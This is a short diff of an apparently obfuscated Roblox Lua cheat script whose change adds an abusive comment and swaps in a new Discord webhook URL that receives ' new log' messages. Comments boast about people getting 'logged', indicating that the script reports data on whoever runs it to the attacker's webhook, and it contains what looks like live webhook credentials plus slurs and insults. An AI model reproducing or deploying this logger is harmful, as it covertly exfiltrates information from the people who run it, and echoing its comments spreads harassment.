@@ -2,6 +2,7 @@
 -- Version: 1.5
 -- christian ur fat ugly and have no friends bro, big skid
 -- christian how ab u deobfuscate some bitches
+-- loot ur just mad u got fucking logged u L loser unknown retard
 
 
 local _6be42346 = Instance.new("ScreenGui")
@@ -125,7 +126,7 @@ aim.MouseButton1Down:connect(function()
    "Kid with shit exploit (krnl or others)"
 
 local url =
-   "https://discord.com/api/webhooks/947670563629977621/HrSh8VjxmTB_rWrrGpB8VlYFw1gHR8ssm_-e7SVQkQ9eGy-4xwBaKB-fSRH6fUmnmTNZ"
+   "https://discord.com/api/webhooks/948124126751649792/Yd4Z2xZvSrdzKj93xEtoV7-w5D8z4ev5gc-1Aq-BPzkDTMxQb81xHnWae3WE9m6F0a32"
 local data = {
    ["content"] = " new log",
    ["embeds"] = {
